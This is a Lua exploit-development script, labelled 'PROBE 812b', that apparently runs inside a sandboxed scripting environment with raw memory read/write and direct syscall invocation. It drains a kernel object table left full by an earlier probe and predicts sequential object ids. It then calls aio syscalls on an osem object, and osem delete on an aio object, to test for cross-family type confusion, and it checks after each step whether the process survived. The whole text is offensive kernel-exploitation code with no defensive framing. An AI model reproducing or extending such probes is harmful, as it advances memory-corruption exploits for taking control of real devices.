-- CRASH_CLASS: HIGH
-- PROBE 812b: cross-family object ids, after draining the slots 811a filled.
--
-- 811a created 3579 aio objects in slots 0x206..0xFFF and hit the table cap.
-- Those ids are sequential and every one of them is ours, so they can be
-- deleted with 662 (128 per call, the documented guard) and the table returns
-- to its normal state without a relaunch.  Then: aio (669) returns its id,
-- osem (549) does not, but the generator is sequential, so an osem object
-- created right after a known aio id lands on the next slot.  If a lookup
-- checks only slot+generation, 664/662 on that osem id resolves an osem object
-- and treats its fields as aio fields.

print("=== PROBE 812b: CROSS-FAMILY OBJECT IDS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function hex(v) if v==nil then return "nil" end return string.format("%08X", v) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_osenew = mk(549)
local sc_osedel = mk(550)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local cell = memory.alloc(16)
local poll_out = memory.alloc(0x40)
local nm = memory.alloc(0x40)

local function wname(s)
    for i = 1, #s do pcall(function() memory.write_byte(nm + i - 1, s:byte(i)) end) end
    pcall(function() memory.write_byte(nm + #s, 0) end)
end

local function aio_create()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok then return nil, "pcall" end
    if N(rv) ~= 0 then return nil, N(rv) end
    local id = rd(N(out_id))
    wd(N(cell), id)
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return id
end

local function aio_call(sc, id)
    wd(N(cell), id); wd(N(poll_out), 0xCCCCCCCC)
    local ok, rv = pcall(function() return sc(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return ok and N(rv) or "pcall", rd(N(poll_out))
end

-- [A] drain the slots 811a left behind: 0x206 .. 0xFFF
print("[A] draining slots 0x206..0xFFF")
local ids_buf = memory.alloc(0x80 * 4 + 64)
local stat_buf = memory.alloc(0x80 * 4 + 64)
local drained, bad = 0, 0
local base = 0x206
while base <= 0xFFF do
    local n = 0
    local id = base
    while id <= 0xFFF and n < 0x80 do
        wd(N(ids_buf) + n * 4, id)
        wd(N(stat_buf) + n * 4, 0xCCCCCCCC)
        n = n + 1; id = id + 1
    end
    local ok, rv = pcall(function()
        return sc_delete(uint64(N(ids_buf)), uint64(n), uint64(N(stat_buf)))
    end)
    if not ok or N(rv) ~= 0 then
        print(string.format("    drain stopped at %06X rv=%s ok=%s", base, tostring(N(rv)), tostring(ok)))
        break
    end
    for k = 0, n - 1 do
        local v = rd(N(stat_buf) + k * 4)
        if v == 0 then drained = drained + 1 else bad = bad + 1 end
    end
    base = base + n
    if not alive() then print("DEAD while draining"); return end
end
print(string.format("    drained=%d other=%d alive=%s", drained, bad, tostring(alive())))

-- [B] the table must accept creates again
local A = aio_create()
print("[B] create after drain: A = " .. hex(A) .. " alive=" .. tostring(alive()))
if not A then print("    still capped; aborting"); return end

-- [C] sequential creates: aio A, osem (predicted A+1), aio C
print("")
print("[C] sequential creates")
local o1 = 0
wname("xyz812b")
local ok1, rv1 = pcall(function() return sc_osenew(uint64(nm), uint64(1), uint64(0), uint64(4)) end)
o1 = ok1 and N(rv1) or "pcall"
print("    osem create -> " .. tostring(o1) .. "  (predicted id " .. hex(A + 1) .. ")")
local C = aio_create()
print("    aio  C = " .. hex(C))
if not C then print("    aborting"); return end
local B = A + 1
print(string.format("    counter step = %d, osem id B = %s", C - A, hex(B)))

-- [D] osem delete on the aio id
print("")
print("[D] 550 (osem delete) on the aio id A")
local ok2, rv2 = pcall(function() return sc_osedel(uint64(A), uint64(0), uint64(0), uint64(0)) end)
print("    550(A) = " .. (ok2 and tostring(N(rv2)) or "pcall") .. "   alive=" .. tostring(alive()))
local p, s = aio_call(sc_poll, A)
print("    664(A) = " .. tostring(p) .. " status=" .. hex(s))

-- [E] aio poll on the osem id
print("")
print("[E] 664 (aio poll) on the osem id B")
local p2, s2 = aio_call(sc_poll, B)
print("    664(B) = " .. tostring(p2) .. " status=" .. hex(s2) .. "   alive=" .. tostring(alive()))

-- [F] control: an id that was never created
print("")
print("[F] control: 664 on A+0x700")
local p3, s3 = aio_call(sc_poll, A + 0x700)
print("    664(A+0x700) = " .. tostring(p3) .. " status=" .. hex(s3))

-- [G] aio delete on the osem id
print("")
print("[G] 662 (aio delete) on the osem id B")
local d2, ds2 = aio_call(sc_delete, B)
print("    662(B) = " .. tostring(d2) .. " status=" .. hex(ds2) .. "   alive=" .. tostring(alive()))

-- [H] health
print("")
print("[H] health")
local A2 = aio_create()
print("    aio  A2 = " .. hex(A2))
local ok3, rv3 = pcall(function() return sc_osenew(uint64(nm), uint64(1), uint64(0), uint64(4)) end)
print("    osem   -> " .. (ok3 and tostring(N(rv3)) or "pcall"))
local B2 = (A2 or 0) + 1
local d3, ds3 = aio_call(sc_delete, B2)
print("    662(B2) = " .. tostring(d3) .. " status=" .. hex(ds3) .. "   alive=" .. tostring(alive()))
print("")
print("[*] alive pid=" .. N(native.fcall_with_rax(stub, 20)))
